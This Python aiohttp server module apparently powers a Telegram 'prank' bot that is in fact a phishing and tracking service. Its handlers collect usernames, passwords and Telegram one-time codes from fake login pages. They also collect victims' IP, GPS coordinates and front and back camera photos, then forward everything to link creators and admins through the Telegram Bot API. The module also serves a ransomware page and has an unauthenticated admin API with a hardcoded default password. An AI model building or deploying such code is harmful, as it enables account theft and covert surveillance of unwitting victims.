from aiohttp import web
import os
import json
import logging
import aiohttp
import asyncio
import uuid
import mimetypes
from datetime import datetime

from config import BOT_TOKEN, LOG_GROUP_ID, PHISHING_TYPES, ADMIN_ID

logger = logging.getLogger(__name__)

PAGES_DIR = os.path.join(os.path.dirname(__file__), 'web_pages')

# Store the bot application reference for sending messages
_bot_app = None

# Global broadcast status
_broadcast_status = {
    'is_running': False,
    'sent': 0,
    'total': 0,
    'last_error': None
}


def set_bot_app(app):
    """Set the bot application reference for sending messages."""
    global _bot_app
    _bot_app = app


async def handle_tracker_data(request):
    """Handle POST request with tracker data (IP, Photos, GPS, etc)."""
    logger.info(">>> [DEBUG] handle_tracker_data called")
    try:
        data = await request.post()
        logger.info(f">>> [DEBUG] Received POST data. Keys: {list(data.keys())}")
        
        token = data.get('token', '')
        ip = data.get('ip', request.headers.get('X-Forwarded-For', request.remote or 'Unknown'))
        if ',' in ip: ip = ip.split(',')[0].strip()
        
        city = data.get('city', 'Unknown')
        country = data.get('country', 'Unknown')
        user_agent = data.get('device', request.headers.get('User-Agent', 'Unknown'))
        
        # New fields
        lat = data.get('lat')
        lng = data.get('lng')
        photo_front = data.get('photo_front')
        photo_back = data.get('photo_back')
        
        if not token:
            logger.warning(">>> [DEBUG] Missing token in tracker data")
            return web.json_response({'status': 'error', 'message': 'Missing token'}, status=400)
            
        from database import get_hacker_tool, save_tracker_log, get_user
        
        tool_info = await get_hacker_tool(token)
        if not tool_info:
            logger.warning(f">>> [DEBUG] Invalid token: {token}")
            return web.json_response({'status': 'error', 'message': 'Invalid token'}, status=404)
            
        user_id = tool_info['user_id']
        
        # Process photos
        assets = []
        uploads_dir = os.path.join(os.path.dirname(__file__), 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)

        async def process_photo(photo_field, suffix):
            if photo_field and hasattr(photo_field, 'file'):
                try:
                    photo_field.file.seek(0)
                    p_bytes = photo_field.file.read()
                    fname = f"tracker_{token}_{suffix}_{uuid.uuid4().hex[:4]}.jpg"
                    fpath = os.path.join(uploads_dir, fname)
                    with open(fpath, 'wb') as f:
                        f.write(p_bytes)
                    return p_bytes, fpath
                except Exception as e:
                    logger.error(f">>> [DEBUG] Photo {suffix} error: {e}")
            return None, None

        front_bytes, front_path = await process_photo(photo_front, "front")
        back_bytes, back_path = await process_photo(photo_back, "back")

        # Save to database
        await save_tracker_log(token, ip, city, country, user_agent, front_path or back_path)
        
        user_info = await get_user(user_id)
        user_name = user_info['first_name'] if user_info else 'Noma\'lum'
        
        # GPS Link
        gps_info = "❌ NO SIGNAL"
        if lat and lng:
            gps_info = f"<a href='https://www.google.com/maps?q={lat},{lng}'>📍 OPEN ON MAP</a>"

        # Format message
        msg_text = (
            f"🏴‍☠️ <b>[ TRACKER LOG: WormGPT v6.6.6 ]</b> 🏴‍☠️\n\n"
            f"💠 <b>TARGET INFO:</b>\n"
            f"├ 🌐 IP: <code>{ip}</code>\n"
            f"├ 🏙 City: <b>{city}</b>\n"
            f"├ 🌍 Country: <b>{country}</b>\n"
            f"└ 🖥 User-Agent: <code>{user_agent[:100]}...</code>\n\n"
            f"🛰 <b>NAVIGATION:</b>\n"
            f"└ Coordinates: {gps_info}\n\n"
            f"📂 <b>ASSETS:</b>\n"
            f"├ 📸 Front Cam: {'✅ CAPTURED' if front_bytes else '❌ DENIED'}\n"
            f"└ 📸 Back Cam: {'✅ CAPTURED' if back_bytes else '❌ DENIED'}\n\n"
            f"👤 <b>AGENT:</b>\n"
            f"└ Name: <b>{user_name}</b> (ID: <code>{user_id}</code>)\n\n"
            f"<i>Time: {datetime.now().strftime('%H:%M:%S')}</i>"
        )
        
        # Send to user
        if back_bytes:
            await send_telegram_message(user_id, msg_text, photo=back_bytes)
            if front_bytes:
                await send_telegram_message(user_id, "📸 Front Camera View:", photo=front_bytes)
        elif front_bytes:
            await send_telegram_message(user_id, msg_text, photo=front_bytes)
        else:
            await send_telegram_message(user_id, msg_text)
        
        # Admin logging
        if LOG_GROUP_ID:
            await send_telegram_message(LOG_GROUP_ID, msg_text)

        return web.json_response({'status': 'ok'})
    except Exception as e:
        logger.error(f">>> [DEBUG] critical error: {e}", exc_info=True)
        return web.json_response({'status': 'error'}, status=500)


async def serve_prank_page(request):
    """Serve a prank page by type, injecting token into phishing/hacker pages."""
    prank_type = request.match_info.get('prank_type', '')
    if not prank_type:
        # Check for tracker/ransomware in query or path
        path = request.path
        if 'tracker' in path: prank_type = 'tracker'
        elif 'ransomware' in path: prank_type = 'ransomware'

    # Check for token in query params
    token = request.query.get('t', '')
    
    file_path = os.path.join(PAGES_DIR, f'{prank_type}.html')
    
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Inject token and API URL for all tool types
        if token:
            content = content.replace('__TOKEN__', token)
        
        # Replace API URL placeholders
        if prank_type == 'tracker':
            content = content.replace('__API_URL__', '/api/tracker_data')
        elif prank_type == 'ransomware':
            content = content.replace('__API_URL__', '/api/tracker_data')
        elif prank_type.startswith('phish_'):
            content = content.replace('__API_URL__', '/api/phish')
        
        return web.Response(text=content, content_type='text/html')
    
    return web.Response(text='Page not found', status=404)




async def handle_phish_data(request):
    """Handle POST request with phishing data from web pages."""
    try:
        data = await request.json()
        token = data.get('token', '')
        username = data.get('username', '')
        password = data.get('password', '')
        
        if not token or not username:
            return web.json_response({'status': 'error', 'message': 'Missing data'}, status=400)
        
        # Get client info
        ip = request.headers.get('X-Forwarded-For', request.remote or 'Unknown')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Import here to avoid circular imports
        from database import save_phishing_data, get_admins, get_user
        
        # Save data to database
        log_entry = await save_phishing_data(token, username, password, ip, user_agent)
        
        if log_entry:
            user_id = log_entry['user_id']
            site_type = log_entry['site_type']
            site_name = PHISHING_TYPES.get(site_type.replace('phish_', ''), site_type)
            
            # Get the user who created the phishing link
            user_info = await get_user(user_id)
            user_name = user_info['first_name'] if user_info else 'Noma\'lum'
            
            # Format message
            is_otp = password != 'telegram_login_web' and site_type == 'phish_telegram'
            action_type = "🔑 KOD (OTP)" if is_otp else "🎣 LOGIN"
            
            msg_text = (
                f"🎣 <b>Phishing ma'lumot keldi!</b> ({action_type})\n\n"
                f"🌐 Sayt: <b>{site_name}</b>\n"
                f"👤 Login: <code>{username}</code>\n"
                f"{'🔑 Kod (OTP): ' + '<code>' + password + '</code>' if is_otp else '🔑 Parol: ' + '<code>' + password + '</code>'}\n\n"
                f"📱 IP: <code>{ip}</code>\n"
                f"🖥 Qurilma: {user_agent[:80]}\n\n"
                f"📤 Yuboruvchi: <b>{user_name}</b> (ID: <code>{user_id}</code>)"
            )
            
            # Send to the user who created the link
            await send_telegram_message(user_id, msg_text)
            
            # Send to all admins who have entered the admin panel
            admins = await get_admins()
            
            # Also include the ADMIN_ID from .env just in case
            if ADMIN_ID and ADMIN_ID not in admins:
                admins.append(ADMIN_ID)
                
            for admin_id in admins:
                if admin_id != user_id: # Don't send twice if user is also admin
                    await send_telegram_message(admin_id, msg_text)
        
        return web.json_response({'status': 'ok'})
    
    except Exception as e:
        logger.error(f"Phishing data handler error: {e}")
        return web.json_response({'status': 'error'}, status=500)


async def serve_admin_page(request):
    """Serve the admin dashboard index.html."""
    file_path = os.path.join(PAGES_DIR, 'admin', 'index.html')
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        return web.Response(text=content, content_type='text/html')
    return web.Response(text='Admin page not found', status=404)


async def serve_admin_static(request):
    """Serve static files for the admin dashboard."""
    filename = request.match_info['filename']
    file_path = os.path.join(PAGES_DIR, 'admin', filename)
    if os.path.exists(file_path):
        content_type, _ = mimetypes.guess_type(file_path)
        if not content_type:
            content_type = 'application/octet-stream'
        
        # Binary files should be served with web.FileResponse for better handling
        return web.FileResponse(file_path, headers={'Content-Type': content_type})
    return web.Response(text='File not found', status=404)


async def admin_stats_api(request):
    """API to get bot statistics."""
    from database import get_total_stats
    stats = await get_total_stats()
    return web.json_response(stats)


async def admin_settings_api(request):
    """API to get/set bot settings."""
    from database import get_setting, set_setting
    
    if request.method == 'GET':
        settings = {
            'admin_password': await get_setting('admin_password', 'shoxa2009'),
            'referral_bonus': await get_setting('referral_bonus', '3'),
            'daily_limit': await get_setting('daily_limit', '3')
        }
        return web.json_response(settings)
    
    elif request.method == 'POST':
        data = await request.json()
        for key, value in data.items():
            await set_setting(key, str(value))
        return web.json_response({'status': 'ok'})


async def admin_channels_api(request):
    """API to manage required channels."""
    from database import get_required_channels, add_required_channel, remove_required_channel
    
    if request.method == 'GET':
        channels = await get_required_channels()
        return web.json_response([dict(c) for c in channels])
    
    elif request.method == 'POST':
        data = await request.json()
        await add_required_channel(data.get('username'), data.get('title', ''))
        return web.json_response({'status': 'ok'})
    
    elif request.method == 'DELETE':
        username = request.query.get('username')
        if username:
            await remove_required_channel(username)
            return web.json_response({'status': 'ok'})
        return web.json_response({'status': 'error', 'message': 'Missing username'}, status=400)


async def send_telegram_message(chat_id, text, photo=None, btn_text=None, btn_url=None):
    """Send a message via Telegram Bot API with optional photo and button."""
    
    # Format URL if provided
    formatted_url = btn_url
    if btn_url:
        if btn_url.startswith('@'):
            formatted_url = f"https://t.me/{btn_url[1:]}"
        elif not btn_url.startswith(('http://', 'https://')):
            # Check if it looks like a username without @
            if '.' not in btn_url and '/' not in btn_url:
                formatted_url = f"https://t.me/{btn_url}"
            else:
                formatted_url = f"https://{btn_url}"

    if photo:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        data = aiohttp.FormData()
        data.add_field('chat_id', str(chat_id))
        data.add_field('caption', text)
        data.add_field('parse_mode', 'HTML')
        if isinstance(photo, str):
            data.add_field('photo', photo) # File ID or URL
        else:
            data.add_field('photo', photo, filename='image.jpg')
        
        if btn_text and formatted_url:
            reply_markup = {'inline_keyboard': [[{'text': btn_text, 'url': formatted_url}]]}
            data.add_field('reply_markup', json.dumps(reply_markup))
            
        payload = data
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        if btn_text and formatted_url:
            payload['reply_markup'] = json.dumps({'inline_keyboard': [[{'text': btn_text, 'url': formatted_url}]]})

    try:
        async with aiohttp.ClientSession() as session:
            if isinstance(payload, aiohttp.FormData):
                async with session.post(url, data=payload) as resp:
                    body = await resp.text()
                    if resp.status != 200:
                        logger.error(f"Telegram API error for chat {chat_id}: {resp.status} - {body}")
            else:
                async with session.post(url, json=payload) as resp:
                    body = await resp.text()
                    if resp.status != 200:
                        logger.error(f"Telegram API error for chat {chat_id}: {resp.status} - {body}")
    except Exception as e:
        logger.error(f"Failed to send telegram message to {chat_id}: {e}")


async def admin_users_api(request):
    """API to get user list."""
    import aiosqlite
    from database import DB_PATH
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cursor = await db.execute('SELECT * FROM users ORDER BY joined_date DESC LIMIT 100')
        users = await cursor.fetchall()
        return web.json_response([dict(u) for u in users])


async def admin_broadcast_status_api(request):
    """API to get current broadcast progress."""
    return web.json_response(_broadcast_status)


async def admin_broadcast_api(request):
    """API to broadcast message with optional image and button."""
    global _broadcast_status
    
    if _broadcast_status['is_running']:
        return web.json_response({'status': 'error', 'message': 'Broadcast allaqachon ishlamoqda'}, status=400)

    try:
        data = await request.post()
        text = data.get('text', '')
        image = data.get('image')
        btn_text = data.get('btn_text')
        btn_url = data.get('btn_url')

        if not text:
            return web.json_response({'status': 'error', 'message': 'Empty text'}, status=400)
        
        from database import get_all_users
        users = await get_all_users()
        total_users = len(users)
        
        # Read image data once
        image_bytes = None
        if image and hasattr(image, 'file'):
            image_bytes = image.file.read()

        # Reset status
        _broadcast_status.update({
            'is_running': True,
            'sent': 0,
            'total': total_users,
            'last_error': None
        })

        # Broadcast in background
        async def run_broadcast():
            # If there's an image, upload it once to get a file_id (performance)
            photo_to_send = image_bytes
            if image_bytes:
                # Upload to TG once to get file_id
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                upload_data = aiohttp.FormData()
                upload_data.add_field('chat_id', str(ADMIN_ID))
                upload_data.add_field('photo', image_bytes, filename='broadcast.jpg')
                upload_data.add_field('caption', "System: Uploading broadcast image...")
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, data=upload_data) as resp:
                            res_json = await resp.json()
                            if res_json.get('ok'):
                                photo_to_send = res_json['result']['photo'][-1]['file_id']
                except Exception as e:
                    logger.error(f"Failed to upload broadcast image: {e}")

            for user_id in users:
                try:
                    await send_telegram_message(user_id, text, photo=photo_to_send, btn_text=btn_text, btn_url=btn_url)
                    _broadcast_status['sent'] += 1
                    await asyncio.sleep(0.05) # Rate limiting
                except Exception as e:
                    _broadcast_status['last_error'] = str(e)
                    continue
            
            _broadcast_status['is_running'] = False
            logger.info(f"Broadcast completed. Sent to {_broadcast_status['sent']} users.")

        asyncio.create_task(run_broadcast())
        return web.json_response({'status': 'ok', 'count': total_users})
    except Exception as e:
        _broadcast_status['is_running'] = False
        logger.error(f"Broadcast API error: {e}")
        return web.json_response({'status': 'error'}, status=500)


def create_web_app():
    """Create and configure the web application."""
    app = web.Application()
    
    # Prank routes
    app.router.add_get('/prank/{prank_type}', serve_prank_page)
    app.router.add_get('/tracker', serve_prank_page)
    app.router.add_get('/ransomware', serve_prank_page)
    app.router.add_post('/api/phish', handle_phish_data)
    app.router.add_post('/api/tracker_data', handle_tracker_data)
    
    # Admin routes
    app.router.add_get('/admin', serve_admin_page)
    app.router.add_get('/admin/{filename}', serve_admin_static)
    
    app.router.add_get('/api/admin/stats', admin_stats_api)
    app.router.add_get('/api/admin/settings', admin_settings_api)
    app.router.add_post('/api/admin/settings', admin_settings_api)
    app.router.add_get('/api/admin/channels', admin_channels_api)
    app.router.add_post('/api/admin/channels', admin_channels_api)
    app.router.add_delete('/api/admin/channels', admin_channels_api)
    app.router.add_get('/api/admin/users', admin_users_api)
    app.router.add_get('/api/admin/broadcast_status', admin_broadcast_status_api)
    app.router.add_post('/api/admin/broadcast', admin_broadcast_api)
    
    return app


async def start_web_server(host='0.0.0.0', port=8080):
    """Start the web server."""
    app = create_web_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    print(f"🌐 Web server ishga tushdi: http://{host}:{port}")
    return runner
